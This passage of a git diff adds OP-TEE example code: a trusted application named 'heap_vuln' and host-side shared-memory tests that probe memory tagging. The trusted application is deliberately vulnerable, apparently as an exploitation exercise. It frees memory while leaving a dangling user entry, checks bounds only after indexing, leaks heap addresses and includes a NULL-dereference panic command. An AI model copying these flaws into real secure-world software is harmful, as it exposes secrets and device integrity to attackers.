++    // mutex_lock(&user_mutex);
++
++    // we don't need to check for validity, the flag stays false.
++    if (users[user_id] == NULL) {
++        DMSG("[User %i] is NULL", (int)user_id);
++        return TEE_ERROR_BAD_PARAMETERS;
++    }
++    if (user_id >= MAX_USER_COUNT) // TODO remove second check for more freedom?
++    {
++        DMSG("Invalid User ID: %i", (int)user_id);
++        return TEE_ERROR_BAD_PARAMETERS;
++    }
++
++    // COPYPASTE 100 TIMES:
++    // I shall not free passwords in memory aquired from other modules, they said. Now it actually doesn't crash anymore.
++    /* free(users[user_id]->password_from_db); */
++    DMSG("Freeing username(%p) of [User %i](%p): %p", &(users[user_id]->username), (int)user_id, users[user_id], users[user_id]->username);
++    free(users[user_id]->username);
++    //if (users[user_id]->is_valid)
++    //{
++    //    DMSG("Freeing username(%p) of [User %i](%p)", &(users[user_id]->username), (int)user_id, users[user_id]);
++    //    free(users[user_id]->username);
++    //    // delay to simulate a slow memory leak
++    //    for (size_t i = 0; i < 1000000; i++)
++    //        for (size_t j = 0; j < 1000000; j++)
++    //            for (size_t k = 0; k < 1000000; k++);
++    //    // Wait for 500ms for double free
++    //    TEE_Wait(500);
++    //    // set the array entry to invalid to allow reusing the array memory
++    //    users[user_id]->is_valid = false;
++    //} else {
++    //    DMSG("Username of [User %i] is NULL", (int)user_id);
++    //}
++
++    // set the array entry to invalid to allow reusing the array memory
++    users[user_id]->is_valid = false;
++
++    // mutex_unlock(&user_mutex);
++
++    DMSG("User exited.");
++    return TEE_SUCCESS;
++}
++
++static TEE_Result call_get_user_addr(uint32_t param_types, TEE_Param params[4])
++{
++    uint32_t exp_param_types = TEE_PARAM_TYPES(
++        TEE_PARAM_TYPE_VALUE_INPUT,  // user id
++        TEE_PARAM_TYPE_VALUE_OUTPUT, // user addr
++        TEE_PARAM_TYPE_NONE,
++        TEE_PARAM_TYPE_NONE);
++
++    SIGN();
++
++    if (param_types != exp_param_types)
++        return TEE_ERROR_BAD_PARAMETERS;
++
++    size_t user_id = reg_pair_to_64(params[0].value.a, params[0].value.b);
++
++    // we don't need to check for validity, the flag stays false.
++    if (users[user_id] == NULL || user_id >= MAX_USER_COUNT) // TODO remove second check for more freedom?
++    {
++        DMSG("Invalid User ID");
++        return TEE_ERROR_BAD_PARAMETERS;
++    }
++
++    // return id of user
++    User *user = users[user_id];
++    reg_pair_from_64((uint64_t)user, &params[1].value.a, &params[1].value.b);
++    DMSG("[User %i] locates at [%#x]", (int)user_id, (uint64_t)user);
++
++    return TEE_SUCCESS;
++}
++
++static TEE_Result call_tell_me(uint32_t param_types, TEE_Param params[4])
++{
++    uint32_t exp_param_types = TEE_PARAM_TYPES(
++        TEE_PARAM_TYPE_VALUE_INPUT,   // user id
++        TEE_PARAM_TYPE_MEMREF_OUTPUT, // SECRET. Iff logged in.
++        TEE_PARAM_TYPE_NONE,
++        TEE_PARAM_TYPE_NONE);
++    SIGN();
++
++    if (param_types != exp_param_types)
++        return TEE_ERROR_BAD_PARAMETERS;
++
++    size_t user_id = reg_pair_to_64(params[0].value.a, params[0].value.b);
++
++    if (users[user_id] == NULL || user_id >= MAX_USER_COUNT ||
++        !users[user_id]->is_valid || !users[user_id]->is_logged_in)
++    {
++        DMSG("Invalid User ID: %i", (int)user_id);
++        return TEE_ERROR_BAD_PARAMETERS;
++    }
++
++    if (params[1].memref.size < strlen(SECRET) + 1)
++        return TEE_ERROR_OUT_OF_MEMORY;
++
++    memcpy(params[1].memref.buffer, SECRET, strlen(SECRET) + 1);
++    params[1].memref.size = strlen(SECRET) + 1;
++    DMSG("Told you so.");
++    return TEE_SUCCESS;
++}
++
++static TEE_Result call_login(uint32_t param_types, TEE_Param params[4])
++{
++
++    uint32_t exp_param_types = TEE_PARAM_TYPES(
++        TEE_PARAM_TYPE_VALUE_INPUT,  // user id
++        TEE_PARAM_TYPE_MEMREF_INPUT, // password
++        TEE_PARAM_TYPE_NONE,
++        TEE_PARAM_TYPE_NONE);
++    SIGN();
++
++    if (param_types != exp_param_types)
++        return TEE_ERROR_BAD_PARAMETERS;
++
++    size_t user_id = reg_pair_to_64(params[0].value.a, params[0].value.b);
++
++    if (users[user_id] == NULL || user_id >= MAX_USER_COUNT ||
++        !users[user_id]->is_valid)
++    {
++        DMSG("Invalid User ID: %i", (int)user_id);
++        return TEE_ERROR_BAD_PARAMETERS;
++    }
++    User *user = users[user_id];
++    if (params[1].memref.size == user->password_len &&
++        memcmp(params[1].memref.buffer, user->password_from_db, user->password_len) == 0)
++    {
++        DMSG("[User %i] Logged in!", (int)user_id);
++        user->is_logged_in = true;
++        return TEE_SUCCESS;
++    }
++    DMSG("Wrong p4ssw0rd for [User %i]!", (int)user_id);
++    return TEE_ERROR_BAD_PARAMETERS;
++}
++
++static TEE_Result call_switch_user(uint32_t param_types, TEE_Param params[4])
++{
++    return TEE_ERROR_OUT_OF_MEMORY;
++}
++
++/*
++ * Called when a TA is invoked. sess_ctx hold that value that was
++ * assigned by TA_OpenSessionEntryPoint(). The rest of the paramters
++ * comes from normal world.
++ */
++TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx,
++                                      uint32_t cmd_id,
++                                      uint32_t param_types, TEE_Param params[4])
++{
++    // char buffer[1024]; // diagnostics
++    (void)&sess_ctx; /* Unused parameter */
++    SIGN();
++
++    switch (cmd_id)
++    {
++    case TA_HEAP_CMD_USER_ENTER:
++        return call_user_enter(param_types, params);
++    case TA_HEAP_CMD_USER_EXIT:
++        return call_user_exit(param_types, params);
++    case TA_HEAP_CMD_LOGIN:
++        return call_login(param_types, params);
++    case TA_HEAP_CMD_TELL_ME:
++        return call_tell_me(param_types, params);
++    case TA_HEAP_CMD_SWITCH_USER:
++        return call_switch_user(param_types, params);
++    case TA_HEAP_CMD_GET_USER_ADDR:
++        return call_get_user_addr(param_types, params);
++
++    case TA_HEAP_CMD_PANIC:
++        return *((TEE_Result *)NULL);
++
++    default:
++        return TEE_ERROR_NOT_SUPPORTED;
++    }
++}
+diff --git a/heap_vuln/ta/include/heap_ta.h b/heap_vuln/ta/include/heap_ta.h
+new file mode 100644
+index 0000000..4a32022
+--- /dev/null
++++ b/heap_vuln/ta/include/heap_ta.h
+@@ -0,0 +1,29 @@
++
++#ifndef TA_HEAP_H
++#define TA_HEAP_H
++
++/*
++ * This UUID is generated with uuidgen
++ * the ITU-T UUID generator at http://www.itu.int/ITU-T/asn1/uuid.html
++ */
++#define TA_HEAP_UUID                                 \
++	{                                                  \
++		0xca212bbe, 0x02b2, 0x422c,                      \
++		{                                                \
++			0x87, 0x20, 0xba, 0x8f, 0x5d, 0x50, 0x41, 0x4c \
++		}                                                \
++	}
++
++/* The function IDs implemented in this TA */
++enum cmd
++{
++	TA_HEAP_CMD_PANIC,
++	TA_HEAP_CMD_USER_ENTER,
++	TA_HEAP_CMD_USER_EXIT,
++	TA_HEAP_CMD_LOGIN,
++	TA_HEAP_CMD_TELL_ME,
++	TA_HEAP_CMD_SWITCH_USER,
++	TA_HEAP_CMD_GET_USER_ADDR,
++};
++
++#endif /*TA_HEAP_H*/
+diff --git a/heap_vuln/ta/sub.mk b/heap_vuln/ta/sub.mk
+new file mode 100644
+index 0000000..2b539ce
+--- /dev/null
++++ b/heap_vuln/ta/sub.mk
+@@ -0,0 +1,5 @@
++global-incdirs-y += include
++srcs-y += heap_ta.c
++
++# To remove a certain compiler flag, add a line like this
++#cflags-template_ta.c-y += -Wno-strict-prototypes
+diff --git a/heap_vuln/ta/user_ta_header_defines.h b/heap_vuln/ta/user_ta_header_defines.h
+new file mode 100644
+index 0000000..e6a906e
+--- /dev/null
++++ b/heap_vuln/ta/user_ta_header_defines.h
+@@ -0,0 +1,66 @@
++/*
++ * Copyright (c) 2016-2017, Linaro Limited
++ * All rights reserved.
++ *
++ * Redistribution and use in source and binary forms, with or without
++ * modification, are permitted provided that the following conditions are met:
++ *
++ * 1. Redistributions of source code must retain the above copyright notice,
++ * this list of conditions and the following disclaimer.
++ *
++ * 2. Redistributions in binary form must reproduce the above copyright notice,
++ * this list of conditions and the following disclaimer in the documentation
++ * and/or other materials provided with the distribution.
++ *
++ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
++ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
++ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
++ * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
++ * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
++ * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
++ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
++ * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
++ * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
++ * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
++ * POSSIBILITY OF SUCH DAMAGE.
++ */
++
++/*
++ * The name of this file must not be modified
++ */
++
++#ifndef USER_TA_HEADER_DEFINES_H
++#define USER_TA_HEADER_DEFINES_H
++
++/* To get the TA UUID definition */
++#include <heap_ta.h>
++
++#define TA_UUID				TA_HEAP_UUID
++
++/*
++ * TA properties: multi-instance TA, no specific attribute
++ * TA_FLAG_EXEC_DDR is meaningless but mandated.
++ */
++#define TA_FLAGS			TA_FLAG_EXEC_DDR | TA_FLAG_SINGLE_INSTANCE | TA_FLAG_MULTI_SESSION | TA_FLAG_INSTANCE_KEEP_ALIVE
++
++/* Provisioned stack size */
++#define TA_STACK_SIZE			(32 * 1024)
++
++/* Provisioned heap size for TEE_Malloc() and friends */
++#define TA_DATA_SIZE			(32 * 1024)
++
++/* The gpd.ta.version property */
++#define TA_VERSION	"1.0"
++
++/* The gpd.ta.description property */
++#define TA_DESCRIPTION	"Example of OP-TEE vuln Trusted Application"
++
++/* Extra properties */
++#define TA_CURRENT_TA_EXT_PROPERTIES \
++    { "org.linaro.optee.examples.vuln.property1", \
++	USER_TA_PROP_TYPE_STRING, \
++        "Some string" }, \
++    { "org.linaro.optee.examples.vuln.property2", \
++	USER_TA_PROP_TYPE_U32, &(const uint32_t){ 0x0010 } }
++
++#endif /* USER_TA_HEADER_DEFINES_H */
+diff --git a/shared_mem/Android.mk b/shared_mem/Android.mk
+new file mode 100644
+index 0000000..11817a5
+--- /dev/null
++++ b/shared_mem/Android.mk
+@@ -0,0 +1,18 @@
++###################### optee-hello-world ######################
++LOCAL_PATH := $(call my-dir)
++
++include $(CLEAR_VARS)
++LOCAL_CFLAGS += -DANDROID_BUILD
++LOCAL_CFLAGS += -Wall
++
++LOCAL_SRC_FILES += host/main.c
++
++LOCAL_C_INCLUDES := $(LOCAL_PATH)/ta/include
++
++LOCAL_SHARED_LIBRARIES := libteec
++LOCAL_MODULE := optee_example_shared_mem
++LOCAL_VENDOR_MODULE := true
++LOCAL_MODULE_TAGS := optional
++include $(BUILD_EXECUTABLE)
++
++include $(LOCAL_PATH)/ta/Android.mk
+diff --git a/shared_mem/CMakeLists.txt b/shared_mem/CMakeLists.txt
+new file mode 100644
+index 0000000..3bcd10c
+--- /dev/null
++++ b/shared_mem/CMakeLists.txt
+@@ -0,0 +1,17 @@
++project (optee_example_shared_mem C)
++
++set (SRC host/main.c)
++
++add_executable (${PROJECT_NAME} ${SRC})
++
++target_compile_options(${PROJECT_NAME}
++	PRIVATE -march=armv8.5-a+memtag
++)
++
++target_include_directories(${PROJECT_NAME}
++			   PRIVATE ta/include
++			   PRIVATE include)
++
++target_link_libraries (${PROJECT_NAME} PRIVATE teec)
++
++install (TARGETS ${PROJECT_NAME} DESTINATION ${CMAKE_INSTALL_BINDIR})
+diff --git a/shared_mem/Makefile b/shared_mem/Makefile
+new file mode 100644
+index 0000000..b188683
+--- /dev/null
++++ b/shared_mem/Makefile
+@@ -0,0 +1,15 @@
++export V?=0
++
++# If _HOST or _TA specific compilers are not specified, then use CROSS_COMPILE
++HOST_CROSS_COMPILE ?= $(CROSS_COMPILE)
++TA_CROSS_COMPILE ?= $(CROSS_COMPILE)
++
++.PHONY: all
++all:
++	$(MAKE) -C host CROSS_COMPILE="$(HOST_CROSS_COMPILE)" --no-builtin-variables
++	$(MAKE) -C ta CROSS_COMPILE="$(TA_CROSS_COMPILE)" LDFLAGS=""
++
++.PHONY: clean
++clean:
++	$(MAKE) -C host clean
++	$(MAKE) -C ta clean
+diff --git a/shared_mem/host/Makefile b/shared_mem/host/Makefile
+new file mode 100644
+index 0000000..ef99069
+--- /dev/null
++++ b/shared_mem/host/Makefile
+@@ -0,0 +1,28 @@
++CC      ?= $(CROSS_COMPILE)gcc
++LD      ?= $(CROSS_COMPILE)ld
++AR      ?= $(CROSS_COMPILE)ar
++NM      ?= $(CROSS_COMPILE)nm
++OBJCOPY ?= $(CROSS_COMPILE)objcopy
++OBJDUMP ?= $(CROSS_COMPILE)objdump
++READELF ?= $(CROSS_COMPILE)readelf
++
++OBJS = main.o
++
++CFLAGS += -Wall -I../ta/include -I$(TEEC_EXPORT)/include -I./include
++#Add/link other required libraries here
++LDADD += -lteec -L$(TEEC_EXPORT)/lib
++
++BINARY = optee_example_shared_mem
++
++.PHONY: all
++all: $(BINARY)
++
++$(BINARY): $(OBJS)
++	$(CC) $(LDFLAGS) -o $@ $< $(LDADD)
++
++.PHONY: clean
++clean:
++	rm -f $(OBJS) $(BINARY)
++
++%.o: %.c
++	$(CC) $(CFLAGS) -c $< -o $@
+diff --git a/shared_mem/host/main.c b/shared_mem/host/main.c
+new file mode 100644
+index 0000000..d6e295e
+--- /dev/null
++++ b/shared_mem/host/main.c
+@@ -0,0 +1,898 @@
++#include <fcntl.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sys/mman.h>
++#include <sys/stat.h>
++#include <sys/types.h>
++#include <sys/prctl.h>
++#include <unistd.h>
++#include <sys/time.h>
++
++// to invoke a write from CA and TA in parallel
++#include <pthread.h>
++
++/* OP-TEE TEE client API (built by optee_client) */
++#include <tee_client_api.h>
++
++/* For the UUID (found in the TA's h-file(s)) */
++#include <shared_mem_ta.h>
++
++/*
++ * From arch/arm64/include/uapi/asm/hwcap.h
++ */
++#define HWCAP2_MTE              (1 << 18)
++
++/*
++ * From arch/arm64/include/uapi/asm/mman.h
++ */
++#define PROT_MTE                 0x20
++
++/*
++ * From include/uapi/linux/prctl.h
++ */
++#define PR_SET_TAGGED_ADDR_CTRL 55
++#define PR_GET_TAGGED_ADDR_CTRL 56
++#define PR_TAGGED_ADDR_ENABLE  (1UL << 0)
++#define PR_MTE_TCF_SHIFT       1
++#define PR_MTE_TCF_NONE        (0UL << PR_MTE_TCF_SHIFT)
++#define PR_MTE_TCF_SYNC        (1UL << PR_MTE_TCF_SHIFT)
++#define PR_MTE_TCF_ASYNC       (2UL << PR_MTE_TCF_SHIFT)
++#define PR_MTE_TCF_MASK        (3UL << PR_MTE_TCF_SHIFT)
++#define PR_MTE_TAG_SHIFT       3
++#define PR_MTE_TAG_MASK        (0xffffUL << PR_MTE_TAG_SHIFT)
++
++/*
++ * Insert a random logical tag into the given pointer.
++ */
++#define insert_random_tag(ptr) ({                       \
++        uint64_t __val;                                 \
++        asm("irg %0, %1" : "=r" (__val) : "r" (ptr));   \
++        __val;                                          \
++})
++
++/*
++ * Set the allocation tag on the destination address.
++ */
++#define set_tag(tagged_addr) do {                                      \
++        asm volatile("stg %0, [%0]" : : "r" (tagged_addr) : "memory"); \
++} while (0)
++
++#define rounddown(x) ((x) & ~(0xffful))
++#define roundup(x) (((x) + 0xffful) & ~(0xffful))
++
++pthread_t threads[2];
++
++typedef struct thread_args_t {
++	TEEC_Operation *op;
++	TEEC_Session *sess;
++	TEEC_SharedMemory *shared_mem;
++	uint32_t *err_origin;
++	bool is_sequential;
++} thread_args_t;
++
++void msleep(unsigned long ms) {
++	struct timespec ts = {
++		.tv_sec  = (long int) (ms / 1000),
++		.tv_nsec = (long int) (ms % 1000) * 1000000ul
++	};
++	nanosleep(&ts, 0);
++}
++
++unsigned long calc_us(struct timeval start, struct timeval end) {
++	unsigned long us_cost;
++	us_cost = 1000000 * (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec);
++	return us_cost;
++}
++
++void parallel_invoke_command(thread_args_t *args) {
++	TEEC_Result res;
++	TEEC_Operation *op = args->op;
++	TEEC_Session *sess = args->sess;
++	TEEC_SharedMemory *shared_mem = args->shared_mem;
++	uint32_t *err_origin = args->err_origin;
++
++	/*
++	 * TA_SHARED_MEM_CMD_INC_VALUE is the actual function in the TA to be
++	 * called.
++	 */
++	printf("Invoking TA to increment buf[0]: %u\n", ((uint8_t *)((*shared_mem).buffer))[0]);
++	res = TEEC_InvokeCommand(sess, TA_SHARED_MEM_CMD_INC_VALUE, op,
++													 err_origin);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	printf("TA incremented buf[0] to: %u\n", ((uint8_t *)((*shared_mem).buffer))[0]);
++}
++
++void parallel_increment_ca(thread_args_t *args) {
++	printf("Incrementing buf[0] in CA\n");
++	if (! args->is_sequential) {
++		printf("Expecting SIGSEGV...\n");
++	}
++	((uint8_t *)((*args->shared_mem).buffer))[0]++;
++	if (! args->is_sequential) {
++		printf("...haven't got one\n");
++	}
++	printf("buf[0] is now: %d\n", ((uint8_t *)((*args->shared_mem).buffer))[0]);
++}
++
++void test_tmpref_seq() {
++	uint8_t *buf;
++	int size;
++	int fd;
++	int ret;
++
++	TEEC_Result res;
++	TEEC_Context ctx;
++	TEEC_Session sess;
++	TEEC_Operation op;
++	TEEC_UUID uuid = TA_SHARED_MEM_UUID;
++	uint32_t err_origin;
++
++	size = getpagesize() * 2;
++
++	printf("Call malloc to allocate buffer\n");
++	buf = (uint8_t *)malloc(size);
++
++	memset(buf, 0, size);
++
++	printf("Allocated buffer: (%p)[%u]\n", buf, size);
++
++	printf("Call TEEC_InitializeContext\n");
++	/* Initialize a context connecting us to the TEE */
++	res = TEEC_InitializeContext(NULL, &ctx);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++	/*
++	 * Open a session to the "shared_mem" TA, the TA will print "hello
++	 * shared mem!" in the log when the session is created.
++	 */
++	printf("Call TEEC_OpenSession\n");
++	res = TEEC_OpenSession(&ctx, &sess, &uuid,
++												 TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++
++	/*
++	 * Execute a function in the TA by invoking it, in this case
++	 * we're incrementing a number.
++	 *
++	 * The value of command ID part and how the parameters are
++	 * interpreted is part of the interface provided by the TA.
++	 */
++
++	/* Clear the TEEC_Operation struct */
++	memset(&op, 0, sizeof(op));
++
++	/*
++	 * Prepare the argument. Pass a value in the first parameter,
++	 * the remaining three parameters are unused.
++	 */
++	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
++																	 TEEC_NONE, TEEC_NONE);
++	op.params[0].tmpref.buffer = buf;
++	op.params[0].tmpref.size = size;
++	buf[0] = 42;
++
++	/*
++	 * TA_SHARED_MEM_CMD_INC_VALUE is the actual function in the TA to be
++	 * called.
++	 */
++
++	// not really registered, only for convenience in testing
++	TEEC_SharedMemory shared_mem = {
++		.buffer = buf,
++		.size = size,
++		.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT
++	};
++	parallel_invoke_command((void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin}));
++	parallel_increment_ca((void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 1}));
++
++	/*
++	 * We're done with the TA, close the session and
++	 * destroy the context.
++	 *
++	 * The TA will print "Goodbye!" in the log when the
++	 * session is closed.
++	 */
++
++	printf("Call TEEC_CloseSession\n");
++	TEEC_CloseSession(&sess);
++
++	printf("Call TEEC_FinalizeContext\n");
++	TEEC_FinalizeContext(&ctx);
++}
++
++void test_tmpref_par() {
++	uint8_t *buf;
++	int size;
++	int fd;
++	int ret;
++
++	TEEC_Result res;
++	TEEC_Context ctx;
++	TEEC_Session sess;
++	TEEC_Operation op;
++	TEEC_UUID uuid = TA_SHARED_MEM_UUID;
++	uint32_t err_origin;
++
++	size = getpagesize() * 2 + 32;
++
++	// printf("Call mmap to allocate a page\n");
++	// buf = (uint8_t *)mmap(0, size, PROT_READ | PROT_WRITE,
++  //                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
++	// fd = open("/dev/zero", O_RDONLY);
++	// buf = (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
++	// close(fd);
++
++	printf("Call malloc to allocate buffer\n");
++	buf = (uint8_t *)malloc(size);
++
++	memset(buf, 0, size);
++
++	printf("Allocated buffer: (%p)[%u]\n", buf, size);
++
++	printf("Call TEEC_InitializeContext\n");
++	/* Initialize a context connecting us to the TEE */
++	res = TEEC_InitializeContext(NULL, &ctx);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++	/*
++	 * Open a session to the "shared_mem" TA, the TA will print "hello
++	 * shared mem!" in the log when the session is created.
++	 */
++	printf("Call TEEC_OpenSession\n");
++	res = TEEC_OpenSession(&ctx, &sess, &uuid,
++												 TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++
++	/*
++	 * Execute a function in the TA by invoking it, in this case
++	 * we're incrementing a number.
++	 *
++	 * The value of command ID part and how the parameters are
++	 * interpreted is part of the interface provided by the TA.
++	 */
++
++	/* Clear the TEEC_Operation struct */
++	memset(&op, 0, sizeof(op));
++
++	/*
++	 * Prepare the argument. Pass a value in the first parameter,
++	 * the remaining three parameters are unused.
++	 */
++	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
++																	 TEEC_NONE, TEEC_NONE);
++	op.params[0].tmpref.buffer = buf;
++	op.params[0].tmpref.size = size;
++	buf[0] = 42;
++
++	/*
++	 * TA_SHARED_MEM_CMD_INC_VALUE is the actual function in the TA to be
++	 * called.
++	 */
++
++	// ret = mprotect(buf, size, PROT_READ);
++	// printf("mprotect (%p) %u, err %d\n", buf, size, ret);
++
++	// printf("Invoking TA to increment buf[0]: %u\n", ((uint8_t *)op.params[0].tmpref.buffer)[0]);
++	// res = TEEC_InvokeCommand(&sess, TA_SHARED_MEM_CMD_INC_VALUE, &op,
++	// 												 &err_origin);
++	// if (res != TEEC_SUCCESS)
++	// 	errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
++	// 			 res, err_origin);
++	// printf("TA incremented buf[0] to: %u\n", ((uint8_t *)op.params[0].tmpref.buffer)[0]);
++
++	// not really registered, only for convenience in testing
++	TEEC_SharedMemory shared_mem = {
++		.buffer = buf,
++		.size = size,
++		.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT
++	};
++	pthread_create(&threads[0], NULL, (void *)parallel_invoke_command, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	// wait for the TA command invocation
++	msleep(100);
++
++	pthread_create(&threads[1], NULL, (void *)parallel_increment_ca, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	// we should finish with a segmentation fault if luck is on our side
++	// since the thread[1] is trying to write to a inaccessible memory
++
++	pthread_join(threads[0], NULL);
++	pthread_join(threads[1], NULL);
++
++	/*
++	 * We're done with the TA, close the session and
++	 * destroy the context.
++	 *
++	 * The TA will print "Goodbye!" in the log when the
++	 * session is closed.
++	 */
++
++	printf("Call TEEC_CloseSession\n");
++	TEEC_CloseSession(&sess);
++
++	printf("Call TEEC_FinalizeContext\n");
++	TEEC_FinalizeContext(&ctx);
++
++	printf("Incrementing buf[0]=%d at %p in CA\n", buf[0], &(buf[0]));
++	buf[0]++;
++	printf("buf[0] is now: %d\n", buf[0]);
++}
++
++void test_memref_alloc() {
++	int size;
++
++	TEEC_Result res;
++	TEEC_Context ctx;
++	TEEC_Session sess;
++	TEEC_Operation op;
++	TEEC_SharedMemory shared_mem;
++	TEEC_UUID uuid = TA_SHARED_MEM_UUID;
++	uint32_t err_origin;
++
++	printf("Call TEEC_InitializeContext\n");
++	/* Initialize a context connecting us to the TEE */
++	res = TEEC_InitializeContext(NULL, &ctx);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++	size = getpagesize();
++	shared_mem.size = size;
++	shared_mem.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
++	printf("Call TEEC_AllocateSharedMemory\n");
++	/* Use TEE Client API to allocate the underlying memory buffer. */
++	res = TEEC_AllocateSharedMemory(&ctx, &shared_mem);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_AllocateSharedMemory failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	printf("Allocated shared memory: (%p)[%u]\n", shared_mem.buffer, shared_mem.size);
++	
++	// The allocated shm should not be inaccessible immediately
++	((uint8_t *)shared_mem.buffer)[0] = 42;
++
++	/*
++	 * Open a session to the "shared_mem" TA, the TA will print "hello
++	 * shared mem!" in the log when the session is created.
++	 */
++	printf("Call TEEC_OpenSession\n");
++	res = TEEC_OpenSession(&ctx, &sess, &uuid,
++												 TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++
++	/*
++	 * Execute a function in the TA by invoking it, in this case
++	 * we're incrementing a number.
++	 *
++	 * The value of command ID part and how the parameters are
++	 * interpreted is part of the interface provided by the TA.
++	 */
++
++	/* Clear the TEEC_Operation struct */
++	memset(&op, 0, sizeof(op));
++
++	/*
++	 * Prepare the argument. Pass a value in the first parameter,
++	 * the remaining three parameters are unused.
++	 */
++	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE, TEEC_NONE, TEEC_NONE);
++	op.params[0].memref.parent = &shared_mem;
++
++	/*
++	 * TA_SHARED_MEM_CMD_INC_VALUE is the actual function in the TA to be
++	 * called.
++	 */
++
++	// ret = mprotect(buf, size, PROT_READ);
++	// printf("mprotect (%p) %u, err %d\n", buf, size, ret);
++
++	// printf("Invoking TA to increment buf[0]: %u\n", ((uint8_t *)shared_mem.buffer)[0]);
++	// res = TEEC_InvokeCommand(&sess, TA_SHARED_MEM_CMD_INC_VALUE, &op,
++	// 												 &err_origin);
++	// if (res != TEEC_SUCCESS)
++	// 	errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
++	// 			 res, err_origin);
++	// printf("TA incremented buf[0] to: %u\n", ((uint8_t *)shared_mem.buffer)[0]);
++
++	// printf("Incrementing buf[0] in CA\n");
++	// ((uint8_t *)shared_mem.buffer)[0]++;
++	// printf("buf[0] is now: %d\n", ((uint8_t *)shared_mem.buffer)[0]);
++
++	pthread_create(&threads[0], NULL, (void *)parallel_invoke_command, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	// wait for the TA command invocation
++	msleep(100);
++
++	// we should finish with a segmentation fault if luck is on our side
++	// since the thread[1] is trying to write to a inaccessible memory
++	pthread_create(&threads[1], NULL, (void *)parallel_increment_ca, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	pthread_join(threads[0], NULL);
++	pthread_join(threads[1], NULL);
++
++	TEEC_ReleaseSharedMemory(&shared_mem);
++
++	/*
++	 * We're done with the TA, close the session and
++	 * destroy the context.
++	 *
++	 * The TA will print "Goodbye!" in the log when the
++	 * session is closed.
++	 */
++
++	printf("Call TEEC_CloseSession\n");
++	TEEC_CloseSession(&sess);
++
++	printf("Call TEEC_FinalizeContext\n");
++	TEEC_FinalizeContext(&ctx);
++}
++
++void test_memref_reg() {
++	uint8_t *buf;
++	int size;
++	int fd;
++	int ret;
++
++	TEEC_Result res;
++	TEEC_Context ctx;
++	TEEC_Session sess;
++	TEEC_Operation op;
++	TEEC_SharedMemory shared_mem;
++	TEEC_UUID uuid = TA_SHARED_MEM_UUID;
++	uint32_t err_origin;
++
++	printf("Call mmap to allocate a page\n");
++	size = getpagesize();
++	fd = open("/dev/zero", O_RDONLY);
++	buf = (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, fd, 0);
++	close(fd);
++
++	printf("Allocated buffer: (%p)[%u]\n", buf, size);
++
++	printf("Call TEEC_InitializeContext\n");
++	/* Initialize a context connecting us to the TEE */
++	res = TEEC_InitializeContext(NULL, &ctx);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++	shared_mem.buffer = buf;
++	shared_mem.size = size;
++	shared_mem.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
++
++	buf[0] = 42;
++
++	printf("Call TEEC_RegisterSharedMemory\n");
++	/* Use TEE Client API to register the underlying memory buffer. */
++	res = TEEC_RegisterSharedMemory(&ctx, &shared_mem);
++	if (res != TEEC_SUCCESS)
